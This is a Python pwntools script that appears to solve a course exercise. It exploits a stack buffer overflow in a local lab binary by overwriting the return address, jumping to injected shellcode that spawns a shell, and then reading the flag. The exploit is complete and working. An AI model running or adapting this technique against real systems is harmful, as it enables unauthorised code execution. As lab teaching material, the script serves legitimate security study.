#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise2/exercise2b'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *check_authorization+91
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

r = start()

# by looking at info frame we know saved rip address; look in stack for that address and count needed padding: 16
padding_length = 16

# start_shell_address must point to the address after the one where saved rip was stored,
# as there is not enough space before (add padding to initial position + 8 to point to next address)
buffer_address = int(r.recvline(), 16)
start_shell_address = p64(buffer_address + padding_length+8)

# from documentation (sh + execve)
shellcode = asm(shellcraft.sh())

# objective is to redirect execution (by overwriting return address) at the given address where we conveniently
# stored the shell code
r.sendline(b"A"*16 + start_shell_address + shellcode)
r.sendline(b"cat flag")

print(r.recvall(timeout=2))
